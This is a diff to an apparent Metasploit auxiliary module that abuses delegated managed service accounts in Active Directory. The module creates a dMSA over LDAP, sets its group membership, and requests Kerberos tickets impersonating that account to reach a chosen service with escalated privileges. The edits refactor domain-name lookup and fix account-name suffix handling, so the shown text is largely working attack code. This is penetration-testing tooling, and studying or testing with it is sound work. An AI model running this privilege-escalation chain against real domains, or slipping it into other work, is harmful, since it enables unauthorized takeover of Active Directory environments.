@@ -153,7 +153,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def create_dmsa(account_name, writeable_dn, group_membership)
-    sam_account_name = account_name + '$' unless account_name.ends_with?('$')
+    sam_account_name = account_name
+    sam_account_name += '$' unless sam_account_name.ends_with?('$')
     dn = "CN=#{account_name},#{writeable_dn}"
     print_status("Attempting to create dmsa account cn: #{account_name}, dn: #{dn}")
 
@@ -162,7 +163,7 @@ class MetasploitModule < Msf::Auxiliary
       'cn' => [account_name],
       'useraccountcontrol' => ['4096'],
       'samaccountname' => [sam_account_name],
-      'dnshostname' => ["#{Faker::Name.first_name}.#{datastore['LDAPDomain']}"],
+      'dnshostname' => ["#{Faker::Name.first_name}.#{domain_dns_name}"],
       'msds-supportedencryptiontypes' => ['28'],
       'msds-managedpasswordinterval' => ['30'],
       'msds-groupmsamembership' => [group_membership],
@@ -211,7 +212,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def query_account(account_name)
-    account_name = datastore['DMSA_ACCOUNT_NAME'] + '$' unless datastore['DMSA_ACCOUNT_NAME'].ends_with?('$')
+    account_name = datastore['DMSA_ACCOUNT_NAME']
+    account_name += '$' unless account_name.ends_with?('$')
     entry = adds_get_object_by_samaccountname(@ldap, account_name)
 
     if entry.nil?
@@ -245,6 +247,18 @@ class MetasploitModule < Msf::Auxiliary
     sd
   end
 
+  def domain_dns_name
+    return @domain_dns_name if @domain_dns_name
+
+    if @ldap
+      @domain_dns_name = adds_get_domain_info(@ldap)[:dns_name]
+    else
+      ldap_connect { |ldap| @domain_dns_name = adds_get_domain_info(ldap)[:dns_name] }
+    end
+
+    @domain_dns_name
+  end
+
   def action_create_dmsa
     ldap_connect do |ldap|
       validate_bind_success!(ldap)
@@ -259,7 +273,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       @ldap = ldap
-      currrent_user_info = adds_get_object_by_samaccountname(ldap, datastore['LDAPUsername'])
+      currrent_user_info = adds_get_current_user(@ldap)
       sid = Rex::Proto::MsDtyp::MsDtypSid.read(currrent_user_info[:objectsid].first)
 
       # Get vulnerable OUs
@@ -319,11 +333,11 @@ class MetasploitModule < Msf::Auxiliary
     impersonate = datastore['DMSA_ACCOUNT_NAME']
     impersonate += '$' unless impersonate.ends_with?('$')
     get_dmsa_tgs_options = {
-      'DOMAIN' => datastore['LDAPDomain'],
+      'DOMAIN' => domain_dns_name,
       'PASSWORD' => datastore['LDAPPassword'],
       'rhosts' => datastore['RHOST'],
       'username' => datastore['LDAPUsername'],
-      'SPN' => "krbtgt/#{datastore['LDAPDomain']}",
+      'SPN' => "krbtgt/#{domain_dns_name}",
       'action' => 'get_tgs',
       'IMPERSONATE' => impersonate,
       'IMPERSONATE_TYPE' => 'dmsa',
@@ -341,7 +355,7 @@ class MetasploitModule < Msf::Auxiliary
       # Lastly request the ticket for the desired service:
       get_priv_esc_tgs_options = {
         'username' => impersonate,
-        'SPN' => "#{datastore['SERVICE']}/#{datastore['RHOSTNAME']}.#{datastore['LDAPDomain']}",
+        'SPN' => "#{datastore['SERVICE']}/#{datastore['RHOSTNAME']}.#{domain_dns_name}",
         'action' => 'get_tgs',
         'krb5ccname' => temp_ccache_file.path,
         'PASSWORD' => :unset,
@@ -360,7 +374,7 @@ class MetasploitModule < Msf::Auxiliary
   def init_authenticator(options = {})
     options.merge!({
       host: rhost,
-      realm: datastore['LDAPDomain'],
+      realm: domain_dns_name,
       username: datastore['LDAPUsername'],
       password: datastore['LDAPPassword'],
       framework: framework,
